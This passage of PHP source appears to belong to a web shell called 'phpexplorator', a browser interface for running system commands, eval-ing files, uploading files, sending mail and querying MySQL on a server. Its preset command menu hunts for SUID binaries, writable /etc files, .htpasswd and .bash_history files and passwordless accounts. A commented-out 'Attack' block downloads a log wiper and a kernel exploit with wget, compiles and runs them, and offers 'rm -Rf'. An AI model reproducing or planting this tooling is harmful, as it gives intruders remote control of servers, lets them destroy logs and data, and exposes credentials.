 <option value="defined_vars"><?php print(PE_translate("defined_vars"));?></option>
 <option value="defined_functions"><?php print(PE_translate("defined_functions"));?></option>
 <option value="defined_constants"><?php print(PE_translate("defined_constants"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="debug_backtrace"><?php print(PE_translate("debug_backtrace"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="apache_request_headers"><?php print(PE_translate("apache_request_headers"));?></option>
 <option value="apache_response_headers"><?php print(PE_translate("apache_response_headers"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="only_shell"><?php print(PE_translate("shell"));?></option>
 <option value="only_replace"><?php print(PE_translate("replace"));?></option>
 <option value="cmd_shell"><?php print(PE_translate("cmd_shell"));?></option>
 <option value="cmd_upload"><?php print(PE_translate("cmd_upload"));?></option>
 <option value="cmd_1"><?php print(PE_translate("cmd_1"));?></option>
 <option value="cmd_2"><?php print(PE_translate("cmd_2"));?></option>
</optgroup>
 </select>
<input type="submit" value="<?php print(PE_translate("run"));?>" />
 <?php print(PE_translate("to"));?>: <input size="35%" type="text" name="PE_the_value"  value="<?php print($PE_thevar["PE_current_file"]);

    ?>" />
 </form>
 </td></tr>

 </table>
 </fieldset>
 <?php
    return $PE_config;
}
/**
* PE_command_upload()
* show form for upload files
*
* @param mixed $PE_config
* @param mixed $PE_thevar
* @param array $PE_language
* @return
*/
function PE_command_upload($PE_config, $PE_thevar, $PE_language = array())
{
    if(empty($PE_config["show_command_upload"])) return false;

    ?>
 <fieldset class="bubble"><legend><?php print(PE_translate("upload"));?></legend>
 <table align="center" class="num1"  width="100%">
 <tr><td align="center">
 <b><u><?php print(PE_translate("upload_file"));

    ?></u></b>
 </td></tr>
 </table>
 <table  align="center" class="num3"  width="100%">
 <tr><td align="center" colspan="2">

 <form method="post" action="<?php print($_SERVER["PHP_SELF"]);

    ?>" enctype="multipart/form-data">
 <input name="MAX_FILE_SIZE" value="32768000" type="hidden" />
         <?php print(PE_integration($PE_config, "input"));

            ?>
 <input type="file" name="PE_the_file" value="<?php print($PE_thevar["PE_current_file"]);

    ?>" />
 <input   size="40%"  type="text" name="PE_the_value" value="<?php print(realpath("." . PE_path_separator()));

    ?>" />
 <input type="hidden" name="PE_select_action" value="unzip" />
 <input type="submit" value="<?php print(PE_translate("upload_zip"));

    ?>" />
 </form>
 </td></tr>
 <tr><td>

 <form method="post" enctype="multipart/form-data" action="<?php print($_SERVER["PHP_SELF"]);

    ?>">
         <?php print(PE_integration($PE_config, "input"));

            ?>
 <input type="hidden" name="PE_select_action" value="upload" />
 <input type="hidden" name="max_file_size" value="32768000" />

 <table>
 <tr>
 <td>
 <i><b><?php print(PE_translate("files"));

    ?></b></i>
 </td>

 <td>
 <i><b><?php print(PE_translate("files"));

    ?></b></i>
 </td>

 </tr>
 <?php
    for($i = 1;$i <= 3;$i++){
        print("<tr><td>");
        print("<input type=\"file\" name=\"PE_the_file$i\" value=\"\" />");
        print("</td><td>");
        print("<input type=\"file\" name=\"PE_the_file" . ($i + 3) . "\" value=\"\" />");
        print("</td></tr>");
    }

    ?>
 <tr><td>
 <input type="submit" value="<?php print(PE_translate("transfert_file"));

    ?>" />
 </td></tr>

 </table>

 </td><td>

 <table>

 <tr>
 <td>
 <i><b><?php print(PE_translate("files"));

    ?></b></i>
 </td>

 <td>
 <i><b><?php print(PE_translate("files"));

    ?></b></i>
 </td>

 </tr>

 <?php
    for($i = 7;$i <= 9;$i++){
        print("<tr><td>");
        print("<input type=\"file\" name=\"PE_the_file$i\" value=\"\" />");
        print("</td><td>");
        print("<input type=\"file\" name=\"PE_the_file" . ($i + 3) . "\" value=\"\" />");
        print("</td></tr>");
    }

    ?>


 <tr><td>
 <input type="submit" value="<?php print(PE_translate("transfert_file"));

    ?>" />
 </td></tr>
 </table>


 </td></tr>
 </table>
 </fieldset>
 </form>
 <?php
    return $PE_config;
}
/**
* PE_shell()
* show form for shell command
*
* @param mixed $PE_config
* @param mixed $PE_thevar
* @param array $PE_language
* @return
*/
function PE_shell($PE_config, $PE_thevar, $PE_language = array())
{
    if(empty($PE_config["show_shell"])) return $PE_config;

    ?>
 <fieldset class="bubble"><legend><?php print(PE_translate("shell"));?></legend>
 <table align="center"  width="100%" class="num3" >
 <tr>
 <td align="left">
 <form method="post" onload="PE_hide('PE_extend_command');" action="<?php print($_SERVER["PHP_SELF"]);

    ?>" enctype="multipart/form-data">
 <b><?php print(PE_translate("cmd_shell"));

    ?></b>:<input type="text"  size="80%"  name="PE_the_file" value="set" />
         <?php print(PE_integration($PE_config, "input"));

            ?>
 <select name="PE_select_action">
<optgroup label="   -   ">
 <option value="exec" selected><?php print(PE_translate("exec"));?></option>
 <option value="shell_exec"><?php print(PE_translate("shell_exec"));?></option>
 <option value="system"><?php print(PE_translate("system"));?></option>
 <option value="replace"><?php print(PE_translate("replace"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="run_code"><?php print(PE_translate("run_code"));?></option>
 <option value="php_credit"><?php print(PE_translate("php_credit"));?></option>
 <option value="php_info"><?php print(PE_translate("php_info"));?></option>
 <option value="ini_get_all"><?php print(PE_translate("ini_get_all"));?></option>
 <option value="loaded_extension"><?php print(PE_translate("loaded_extension"));?></option>
 <option value="extension_function"><?php print(PE_translate("extension_function"));?></option>
 <option value="defined_vars"><?php print(PE_translate("defined_vars"));?></option>
 <option value="defined_functions"><?php print(PE_translate("defined_functions"));?></option>
 <option value="defined_constants"><?php print(PE_translate("defined_constants"));?></option>
 <option value="print_r"><?php print(PE_translate("print_r"));?></option>
 <option value="var_dump"><?php print(PE_translate("var_dump"));?></option>
 <option value="var_export"><?php print(PE_translate("var_export"));?></option>
 <option value="debug_backtrace"><?php print(PE_translate("debug_backtrace"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="apache_request_headers"><?php print(PE_translate("apache_request_headers"));?></option>
 <option value="apache_response_headers"><?php print(PE_translate("apache_response_headers"));?></option>
</optgroup>
<optgroup label="   -   ">
  <option value="md5_text"><?php print(PE_translate("md5_text"));?></option>
 <option value="sha1_text"><?php print(PE_translate("sha1_text"));?></option>
 <option value="crc32_text"><?php print(PE_translate("crc32_text"));?></option>
 <option value="str_rot13_text"><?php print(PE_translate("str_rot13_text"));?></option>
 <option value="base64_encode_text"><?php print(PE_translate("base64_encode_text"));?></option>
 <option value="base64_decode_text"><?php print(PE_translate("base64_decode_text"));?></option>
 <option value="urlencode_text"><?php print(PE_translate("urlencode_text"));?></option>
 <option value="urldecode_text"><?php print(PE_translate("urldecode_text"));?></option>
</optgroup>
</select>
 <input type="submit" value="<?php print(PE_translate("run"));

    ?>" />
 </form>
 </td>
 </tr>

 <tr>
 <td align="left">
<form method="post" onload="PE_hide('PE_extend_command');" action="<?php print($_SERVER["PHP_SELF"]);?>" enctype="multipart/form-data">
<input type="hidden"  size="80%"  name="PE_select_action" value="exec" />
<b><?php print(PE_translate("cmd_shell"));?></b>:<select name="PE_the_file">
<optgroup label="   List   ">
	<option value="ls -la">list hide files</option>
	<option value="lsattr -va">list file attributes </option>
	<option value="df -h">list mount </option>
	<option value="ps -aux">list process </option>
	<option value="lspci">list pci port</option>
	<option value="lsusb">list usb port</option>
	<option value="lsof">list opened files</option>
	<option value="lsmod">list loaded modules</option>
</optgroup>

<optgroup label="   Info   ">
	<option value="uname -a">Show Kernel version</option>
	<option value="cat /proc/version /proc/cpuinfo">Show CPUINFO</option>
	<option value="ifconfig -a">IP config</option>
	<option value="arp -a">Arp config</option>
	<option value="uptime">Uptime</option>
	<option value="netstat -atup | grep IST">Show open ports</option>
	<option value="netstat -an | grep -i listen">Show opened ports</option>
</optgroup>

<optgroup label="   Users   ">
	<option value="w">Show logged in users</option>
	<option value="lastlog">Show last to connect</option>
	<option value="tail /var/log/messages">Show last logs</option>
	<option value="dmesg ">Show boot logs</option>
	<option value="cut -d: -f1,2,3 /etc/passwd | grep ::">!user without password!</option>
</optgroup>

<optgroup label="   Find   ">
	<option value="find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2&gt; /dev/null">find suid in bins</option>
	<option value="find /etc/ -type f -perm -o+w 2&gt; /dev/null">find Writeble files in /etc/</option>
	<option value="find . -type f -perm -04000 -ls">find suid files in current dir</option>
	<option value="find . -type f -perm -02000 -ls">find sgid files in current dir</option>
	<option value="find . -type f -name &quot;config*&quot;">find config* files in current dir</option>
	<option value="find . -perm -2 -ls">find writable folders and files in current dir</option>
	<option value="find . -type f -name service.pwd">find service.pwd files in current dir</option>
	<option value="find . -type f -name .htpasswd">find .htpasswd files in current dir</option>
	<option value="find . -type f -name .bash_history">find .bash_history files in current dir</option>
	<option value="find . -type f -name .fetchmailrc">find .fetchmailrc files in current dir</option>
</optgroup>

<!--optgroup label="   !!Attack!! (DANGEROUS!!)   ">
	<option value="rm -Rf">Delete all like Format (DANGEROUS)</option>
	<option value="which wget curl w3m lynx">Find Downloaders</option>
	<option value="wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c">WIPELOGS PT1 (If wget installed)</option>
	<option value="wget http://ftp.powernet.com.tr/supermail/debug/k3">Attack Kernel (Krad.c) PT1 (If wget installed)</option>
	<option value="locate gcc">locate gcc installed</option>
	<option value="gcc zap2.c -o zap2">Compile WIPELOGS PT2</option>
	<option value="./zap2">WIPELOGS PT3</option>
	<option value="./k3 1">Attack Kernel (Krad.c) PT2 (L1)</option>
	<option value="./k3 2">Attack Kernel (Krad.c) PT2 (L2)</option>
	<option value="./k3 3">Attack Kernel (Krad.c) PT2 (L3)</option>
	<option value="./k3 4">Attack Kernel (Krad.c) PT2 (L4)</option>
	<option value="./k3 5">Attack Kernel (Krad.c) PT2 (L5)</option>
</optgroup-->
  </select>
 <input type="submit" value="<?php print(PE_translate("run "));?>" />
 </form>
 </td>
 </tr>

 </table>
 </fieldset>
 <?php
    return $PE_config;
}
/**
* PE_command_extend()
* show extend form for shell command
*
* @param mixed $PE_config
* @param mixed $PE_thevar
* @param array $PE_language
* @return
*/
function PE_command_extend($PE_config, $PE_thevar, $PE_language = array())
{
    if(empty($PE_config["show_command_extend"])) return $PE_config;

    ?>
 <fieldset class="bubble"><legend><?php print(PE_translate("command_extend"));?></legend>
 <table align="center"  width="100%" class="num3" >
 <tr>
 <td align="left">
 <form method="post" action="<?php print($_SERVER["PHP_SELF"]);

    ?>" enctype="multipart/form-data">
 <b><?php print(PE_translate("cmd_one"));

    ?></b>:<input    size="80%"  type="text" name="PE_the_file"  value="<?php print($PE_thevar["PE_current_file"]);

    ?>" />
         <?php print(PE_integration($PE_config, "input"));

            ?>
 <select name="PE_select_action">
<optgroup label="   -   ">
 <option value="property"><?php print(PE_translate("property"));?></option>
 <option value="list"><?php print(PE_translate("list"));?></option>
 <option value="edit"><?php print(PE_translate("edit"));?></option>
 <option value="download"><?php print(PE_translate("download"));?></option>
 <option value="include"><?php print(PE_translate("include"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="new_file"><?php print(PE_translate("new_file"));?></option>
 <option value="new_dir"><?php print(PE_translate("new_dir"));?></option>
 <option value="delete"><?php print(PE_translate("delete"));?></option>
 <option value="rm_dir"><?php print(PE_translate("rm_dir"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="zip"><?php print(PE_translate("zip"));?></option>
 <option value="unzip"><?php print(PE_translate("unzip"));?></option>
 <!--option value="gz">Gzip file</option>
 <option value="bz2">Bz2 file</option-->
</optgroup>
<optgroup label="   -   ">
 <option value="md5_file"><?php print(PE_translate("md5_file"));?></option>
 <option value="sha1_file"><?php print(PE_translate("sha1_file"));?></option>
 <option value="crc32_file"><?php print(PE_translate("crc32_file"));?></option>
 <option value="str_rot13_file"><?php print(PE_translate("str_rot13_file"));?></option>
 <option value="base64_encode_file"><?php print(PE_translate("base64_encode_file"));?></option>
 <option value="base64_decode_file"><?php print(PE_translate("base64_decode_file"));?></option>
 <option value="urlencode_file"><?php print(PE_translate("urlencode_file"));?></option>
 <option value="urldecode_file"><?php print(PE_translate("urldecode_file"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="addslashes_file"><?php print(PE_translate("addslashes_file"));?></option>
 <option value="bin2hex_file"><?php print(PE_translate("bin2hex_file"));?></option>
 <option value="count_chars_file"><?php print(PE_translate("count_chars_file"));?></option>
 <!--option value="count_line_file">Count Line</option-->
 <option value="crypt_file"><?php print(PE_translate("crypt_file"));?></option>
 <option value="hebrevc_file"><?php print(PE_translate("hebrevc_file"));?></option>
</optgroup>
<optgroup label="   -   ">
 <option value="str_word_count_file"><?php print(PE_translate("str_word_count_file"));?></option>
 <option value="stripslashes_file"><?php print(PE_translate("stripslashes_file"));?></option>
 <option value="strlen_file"><?php print(PE_translate("strlen_file"));?></option>
 <option value="strrev_file"><?php print(PE_translate("strrev_file"));?></option>
</optgroup>
 </select>
 <input type="submit" value="<?php print(PE_translate("run"));?>" />
 </form>

 </td>
 </tr>
 <tr>
 <td align="left">
 <form method="post" action="<?php print($_SERVER["PHP_SELF"]);?>" enctype="multipart/form-data">
 <b><?php print(PE_translate("cmd_two"));?></b>
 <input   size="40%"  type="text"  name="PE_the_file"  value="<?php print($PE_thevar["PE_current_file"]);?>" />
 =>
 <?php print(PE_integration($PE_config, "input"));?>
 <select name="PE_select_action">
 <option value="copy"><?php print(PE_translate("copy"));?></option>
 <option value="dir_copy"><?php print(PE_translate("dir_copy"));?></option>
 <option value="move"><?php print(PE_translate("move"));?></option>
 <option value="dir_move"><?php print(PE_translate("dir_move"));?></option>
 <option value="rename"><?php print(PE_translate("rename"));?></option>
 <option value="set_mod"><?php print(PE_translate("set_mod"));?></option>
 <option value="set_own"><?php print(PE_translate("set_own"));?></option>
 <option value="set_grp"><?php print(PE_translate("set_grp"));?></option>
 <option value="set_touch"><?php print(PE_translate("set_touch"));?></option>
 <option value="unzip_to"><?php print(PE_translate("unzip_to"));?></option>
 </select>
=>
 <input size="40%" type="text" name="PE_the_value" value="<?php print($PE_thevar["PE_current_file"]);?>" />
 <input type="submit" value="<?php print(PE_translate("run"));?>" />
 </form>

 </td>
 </tr>
 </table>
 </fieldset>
 <?php
    return $PE_config;
}



function PE_replace($PE_config, $PE_thevar, $PE_language = array())
{
if(empty($PE_config["show_replace"])) return $PE_config;

?>

<div id="replace_div">
 <fieldset class="bubble"><legend><?php print(PE_translate("replace"));?></legend>
<br />
<form action="<?php print($_SERVER["PHP_SELF"]);?>" method="post" ENCTYPE="multipart/form-data">
<input type=hidden name="MAX_FILE_SIZE" VALUE="32768000" />
<input type="hidden" name="PE_select_action" value="replace" />
<?php print(PE_integration($PE_config, "input"));?>

<input size="20" type="checkbox" value="yes"  id="sensitive" name="sensitive" />

<?php print(PE_translate("sensitive"));?>

<input size="20" type="checkbox" value="yes"  id="regular" name="regular" checked />

<?php print(PE_translate("regular_expression"));?>


<input size="20" type="checkbox" value="yes"  id="recursive" name="recursive" />

<?php print(PE_translate("recursive"));?>


<input size="20" type="checkbox" value="find_only"  id="destination_action" name="destination_action"
      onclick="PE_check_hide('destination_action', 'replace_text', 'inverse');
   " />

<?php print(PE_translate("find_only"));?>



<table class="normal_text" border="1"  align="center">

<tr>
<td colspan="4">
<fieldset class="bubble"><legend>
<?php print(PE_translate("code"));?>

:</legend>
<ul>
<li />      [[:alnum:]]  - [A-Za-z0-9]
<?php print(PE_translate("alphanumeric"));?>


<li />      [[:alpha:]]  - [A-Za-z]
<?php print(PE_translate("alphabetic"));?>


<li />      [[:blank:]]  - [ \x09]
<?php print(PE_translate("space_tab"));?>


<li />      [[:cntrl:]]  - [\x00-\x19\x7F]
<?php print(PE_translate("control"));?>


<li />      [[:digit:]]  - [0-9]
<?php print(PE_translate("numeric"));?>


<li />      [[:graph:]]  - [!-~]
<?php print(PE_translate("printable"));?>


<li />      [[:lower:]]  - [a-z]
<?php print(PE_translate("lower_case"));?>


<li />      [[:print:]]  - [ -~]
<?php print(PE_translate("printable_control"));?>


<li />      [[:punct:]]  - [!-/:-@[-{-~]
<?php print(PE_translate("punctuation"));?>


<li />      [[:space:]]  - [ \t\v\f]
<?php print(PE_translate("all_whitespace"));?>


<li />      [[:upper:]]  - [A-Z]

<?php print(PE_translate("upper_case"));?>


<li />      [[:xdigit:]] - [0-9a-fA-F]
<?php print(PE_translate("hexadecimal"));?>


</ul>
</fieldset>
 </td>
</tr>

<tr>
 <td colspan="2">

<?php print(PE_translate("match"));?>


 </td>
 <td colspan="2">


<?php print(PE_translate("replace"));?>


 </td>
</tr>


<tr>
 <td colspan="2">
   <input size="20" type="checkbox" value="php"  id="source_action" name="source_action" />


<?php print(PE_translate("php_code"));?>


 </td>
 <td>
   <input size="20" type="checkbox" value="yes"  id="with_backup" name="with_backup" checked
   onclick="PE_check_hide('with_backup', 'with_estension', 'normal');
   " />

<?php print(PE_translate("backup"));?>


 </td>

 <td>
   <input size="5" type="text" value=".bak"  id="with_estension" name="with_estension" />
 </td>
</tr>

<tr>
 <td>

<?php print(PE_translate("input"));?>


 <select name="source_type" id="source_type" onchange="
 PE_hide_group_value('source_type','remote_folder,remote_zip,remote_file','remote_file_source','local_file_source');
 PE_hide_group_value('source_type','local_file,local_zip','local_file_source','remote_file_source');
 ">
 <option value="local_file">
<?php print(PE_translate("local_file"));?>

</option>
 <option value="local_zip">
<?php print(PE_translate("local_zip"));?>

</option>
 <option value="remote_file">
<?php print(PE_translate("remote_file"));?>

</option>
 <option value="remote_zip">
<?php print(PE_translate("remote_zip"));?>

</option>
 <option value="remote_folder">
<?php print(PE_translate("remote_folder"));?>

</option>
 </select>
 </td>

 <td>
  <input size="20" type="text" value=""  id="remote_file_source" name="remote_file_source" />
   <input type="file" value="/temp"  id="local_file_source" name="local_file_source" /><br />
 </td>

 <td>


<?php print(PE_translate("output"));?>


 <select name="destination_type" id="destination_type" onchange="
 PE_hide_group_value('destination_type','!remote_folder,remote_zip','destination_replace','');
 ">
 <option value="download">
<?php print(PE_translate("download"));?>

</option>
 <option value="remote_folder">
<?php print(PE_translate("remote_folder"));?>

</option>
 <option value="remote_zip">
<?php print(PE_translate("remote_zip"));?>

</option>
 <option value="print">
<?php print(PE_translate("print"));?>

</option>
 </select>
 </td>

 <td>
   <input size="20" type="text" value=""  id="destination_replace" name="destination_replace" />
   <!--php print("download:"));-><input size="1" type="checkbox" value=""  id="destination_download" name="destination_download" /> <br /-->
 </td>
</tr>

<tr>
 <td colspan="2">
<?php print(PE_translate("match_text"));?>

<br />
   <textarea rows="4" cols="40" name="match_text" id="match_text" >
</textarea>
 </td>
 <td colspan="2">
<?php print(PE_translate("replace_text"));?>
<br />
   <textarea rows="4" cols="40" name="replace_text" id="replace_text" ></textarea>
 </td>
</tr>




</table>
</fieldset>




<br />

<p align="center">
   <input class="submit" type="reset" onclick="return confirm('<?php print(PE_translate("reset_form"));?>')" />
   <input class="submit" type="submit" value="<?php print(PE_translate("submit"));?>" onclick="return confirm('<?php print(PE_translate("submit_java"));?>')" />
 </p>



</form>


</div>
<script language="javascript" type="text/javascript">
 PE_hide_group_value('source_type','remote_folder,remote_zip,remote_file','remote_file_source','local_file_source');
 PE_hide_group_value('source_type','local_file,local_zip','local_file_source','remote_file_source');
 PE_hide_group_value('destination_type','!remote_folder,remote_zip','destination_replace','');
</script>

 </fieldset>

</div>

 <?php
    return $PE_config;
}








function PE_email($PE_config, $PE_thevar, $PE_language = array())
{
if(empty($PE_config["show_email"])) return $PE_config;

?>

<div id="email_div">
 <fieldset class="bubble"><legend><?php print(PE_translate("e-mail"));?></legend>
<br />
<form action="<?php print($_SERVER["PHP_SELF"]);?>" method="post" ENCTYPE="multipart/form-data">
<input type=hidden name="MAX_FILE_SIZE" VALUE="32768000" />
<input type="hidden" name="PE_select_action" value="email" />
<?php print(PE_integration($PE_config, "input"));?>



<table class="normal_text" border="1"  align="center">

<tr>
 <td>
 <?php print(PE_translate("From:"));?>
   <input size="5" type="text" value=""  id="PE_from" name="PE_from" />
 </td>
</tr>

<tr>
 <td>
 <?php print(PE_translate("to:"));?>
   <input size="5" type="text" value=""  id="PE_to" name="PE_to" />
 </td>
</tr>

<tr>
 <td>
 <?php print(PE_translate("title:"));?>
   <input size="5" type="text" value=""  id="PE_subject" name="PE_subject" />
 </td>
</tr>


<tr>
 <td>
<?php print(PE_translate("match_text"));?>

<br />
   <textarea rows="4" cols="40" name="PE_message" id="PE_message" >
</textarea>
 </td>
</tr>




</table>
</fieldset>




<br />

<p align="center">
   <input class="submit" type="reset" onclick="return confirm('<?php print(PE_translate("reset_form"));?>')" />
   <input class="submit" type="submit" value="<?php print(PE_translate("submit"));?>" onclick="return confirm('<?php print(PE_translate("submit_java"));?>')" />
 </p>



</form>


</div>
 </fieldset>

</div>

 <?php
    return $PE_config;
}








function PE_mysql($PE_config, $PE_thevar, $PE_language = array())
{
if(empty($PE_config["show_mysql"])) return $PE_config;

?>

<div id="mysql_div">
 <fieldset class="bubble"><legend><?php print(PE_translate("Mysql"));?></legend>
<br />
<form action="<?php print($_SERVER["PHP_SELF"]);?>" method="post" ENCTYPE="multipart/form-data">
<input type=hidden name="MAX_FILE_SIZE" VALUE="32768000" />
<input type="hidden" name="PE_select_action" value="mysql" />
<?php print(PE_integration($PE_config, "input"));?>



<table class="normal_text" border="1"  align="center">

<tr>
 <td>
 <?php print(PE_translate("Host:"));?>
   <input size="5" type="text" value=""  id="PE_from" name="PE_host" /> -
 <?php print(PE_translate("Port:"));?>
   <input size="5" type="text" value=""  id="PE_port" name="PE_port" />
 </td>
</tr>

<tr>
 <td>
 <?php print(PE_translate("User:"));?>
   <input size="5" type="text" value=""  id="PE_user" name="PE_user" /> -
 <?php print(PE_translate("Password:"));?>
   <input size="5" type="text" value=""  id="PE_password" name="PE_password" />
 </td>
</tr>

</table>
</fieldset>




<br />

<p align="center">
   <input class="submit" type="reset" onclick="return confirm('<?php print(PE_translate("reset_form"));?>')" />
   <input class="submit" type="submit" value="<?php print(PE_translate("submit"));?>" onclick="return confirm('<?php print(PE_translate("submit_java"));?>')" />
 </p>



</form>
</fieldset>




<fieldset class="bubble"><legend><?php print(PE_translate("Mysql"));?></legend>
<form action="<?php print($_SERVER["PHP_SELF"]);?>" method="post" ENCTYPE="multipart/form-data">
<input type="hidden" name="PE_select_action" value="query" />
<?php print(PE_integration($PE_config, "input"));?>
<table class="normal_text" border="1"  align="center">
<tr>
 <td>
<?php print(PE_translate("Query"));?>
<br />
   <textarea rows="4" cols="40" name="PE_query" id="PE_query" >
</textarea>
 </td>
</tr>

<p align="center">
   <input class="submit" type="submit" value="<?php print(PE_translate("submit"));?>" onclick="return confirm('<?php print(PE_translate("submit_java"));?>')" />
 </p>
</table>
</form>
</fieldset>

</div>

 <?php
    return $PE_config;
}






/**
* PE_action()
* usefull to manage all actions needed by the user
*
* @param mixed $PE_config
* @param mixed $PE_thevar
* @param array $PE_language
* @return
*/
function PE_action($PE_config, $PE_thevar, $PE_language = array())
{
    if(empty($PE_config["show_action"])) return $PE_config;

    ?>
<br />
<fieldset class="bubble"><legend><?php print(PE_translate("action"));?></legend>
 <table class="num0" border="0"  width="100%">
 <?php
    print("<tr><td align=\"left\">");
    /**
    */
    $message_ok = "<br /> " . PE_translate("action") . " <b>" . $PE_thevar["select_action"] . "</b> " . PE_translate("run_succ") . " " . $PE_thevar["the_file"] . ", " . $PE_thevar["the_value"] . "<br />";
    $message_not_ok = "<br />!!!  " . PE_translate("action") . " <b>" . $PE_thevar["select_action"] . "</b> " . PE_translate("cant_run") . " " . $PE_thevar["the_file"] . ", " . $PE_thevar["the_value"] . "!!!<br />";

// ------ admin actions -------
    if($PE_config["user_policy"] == "admin"){
        switch ($PE_thevar["select_action"]){
        case "php_credit":
            phpcredits(CREDITS_ALL);
            break;
        case "ini_get_all":
            PE_print_r(ini_get_all());
            break;
        case "loaded_extension":
            PE_print_r(get_loaded_extensions());
            break;
        case "defined_vars":
            PE_print_r(get_defined_vars());
            break;
        case "defined_functions":
            PE_print_r(get_defined_functions());
            break;
        case "extension_function":
            PE_print_r(get_extension_funcs($PE_thevar["the_file"]));
            break;
        case "apache_request_headers":
            PE_print_r(apache_request_headers());
            break;
        case "apache_response_headers":
            PE_print_r(apache_response_headers());
            break;
        case "crc32_file":
            print("<pre>");
            printf("%u\n", crc32(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])));
            print("</pre>");
            break;

        case "str_rot13_file":
            print("<pre>");
            print(str_rot13(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])));
            print("</pre>");
            break;

        case "base64_encode_file":
            print("<pre>");
            print(chunk_split(base64_encode(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"]))));
            print("</pre>");
            break;
        case "base64_decode_file":
            print("<pre>");
            print(base64_decode(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])));
            print("</pre>");
            break;
        case "urlencode_file":
            print("<pre>");
            print(urlencode(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])));
            print("</pre>");
            break;
        case "urldecode_file":
            print("<pre>");
            print(urldecode(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])));
            print("</pre>");
            break;
        case "addslashes_file":
            print("<pre>");
            print(addslashes(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])));
            print("</pre>");
            break;
        case "stripslashes_file":
            print("<pre>");
            print(stripslashes(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])));
            print("</pre>");
            break;
        case "strrev_file":
            print("<pre>");
            print(strrev(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])));
            print("</pre>");
            break;
        case "htmlentities_file":
            print("<pre>");
            print(htmlentities(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])));
            print("</pre>");
            break;
        case "hebrevc_file":
            print("<pre>");
            print(hebrevc(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])));
            print("</pre>");
            break;
        case "bin2hex_file":
            print("<pre>");
            print(urldecode(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])));
            print("</pre>");
            break;
        case "count_chars_file":
            print("<pre>");
            PE_print_r(count_chars(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])));
            print("</pre>");
            break;
        case "crypt_file":
            print("<pre>");
            print(crypt(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])));
            print("</pre>");
            break;
            case "include":
            if(include($PE_thevar["the_file"])){
                print($message_ok);
            }else{
                print($message_not_ok);
            }
            break;
            case "run_file":
                print("<br />@@@@@@@@@@@@@@@@@@@@@ BEGIN RUNNING  @@@@@@@@@@@@@@@@@@@@<br />");
                eval(file_get_contents($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"]));
                print("<br />@@@@@@@@@@@@@@@@@@@@@  END RUNNING  @@@@@@@@@@@@@@@@@@@@<br />");
                break;
            case "delete":
                if(unlink($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])){
                    print($message_ok);
                }else{
                    print($message_not_ok);
                }
                break;
            case "rm_dir":
                if(PE_dir_remove($PE_config, $PE_thevar["the_file"])){
                    print($message_ok);
                }else{
                    print($message_not_ok);
                }
                break;
            case "new_dir":
                if(mkdir($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"])){
                    print($message_ok);
                }else{
                    print($message_not_ok);
                }
                break;
            case "copy":
                if(PE_dir_copy($PE_config, $PE_thevar["the_file"], $PE_thevar["the_value"])){
                    print($message_ok);
                }else{
                    print($message_not_ok);
                }
                break;
            case "only_shell":
                $PE_config["show_shell"] = "1"; //--(0,1)--1 to show phpexplorator shell
                $PE_config["show_replace"] = "0"; //--(0,1)--1 to show phpexplorator replace
                $PE_config["show_command_extend"] = "0";
                $PE_config["show_command_upload"] = "0";
                $PE_config["show_command_1"] = "0";
                $PE_config["show_command_2"] = "0";
                $PE_config["show_email"] = "0";
                $PE_config["show_mysql"] = "0";
                break;
            case "only_mysql":
                $PE_config["show_shell"] = "0"; //--(0,1)--1 to show phpexplorator shell
                $PE_config["show_replace"] = "0"; //--(0,1)--1 to show phpexplorator replace
                $PE_config["show_command_extend"] = "0";
                $PE_config["show_command_upload"] = "0";
                $PE_config["show_command_1"] = "0";
                $PE_config["show_command_2"] = "0";
                $PE_config["show_email"] = "0";
                $PE_config["show_mysql"] = "1";
                break;
            case "only_mail":
                $PE_config["show_shell"] = "0"; //--(0,1)--1 to show phpexplorator shell
                $PE_config["show_replace"] = "0"; //--(0,1)--1 to show phpexplorator replace
                $PE_config["show_command_extend"] = "0";
                $PE_config["show_command_upload"] = "0";
                $PE_config["show_command_1"] = "0";
                $PE_config["show_command_2"] = "0";
                $PE_config["show_email"] = "1";
                $PE_config["show_mysql"] = "0";
                break;
            case "only_replace":
                $PE_config["show_replace"] = "1"; //--(0,1)--1 to show phpexplorator replace
                $PE_config["show_shell"] = "0"; //--(0,1)--1 to show phpexplorator shell
                $PE_config["show_command_extend"] = "0";
                $PE_config["show_command_upload"] = "0";
                $PE_config["show_command_1"] = "0";
                $PE_config["show_command_2"] = "0";
                $PE_config["show_email"] = "0";
                $PE_config["show_mysql"] = "0";
                break;
            case "cmd_shell":
                $PE_config["show_command_extend"] = "1"; //--(0,1)--1 to show phpexplorator command_extend
                $PE_config["show_replace"] = "0"; //--(0,1)--1 to show phpexplorator replace
                $PE_config["show_shell"] = "0";
                $PE_config["show_command_upload"] = "0";
                $PE_config["show_command_1"] = "0";
                $PE_config["show_command_2"] = "0";
                $PE_config["show_email"] = "0";
                $PE_config["show_mysql"] = "0";
                break;
            case "cmd_upload":
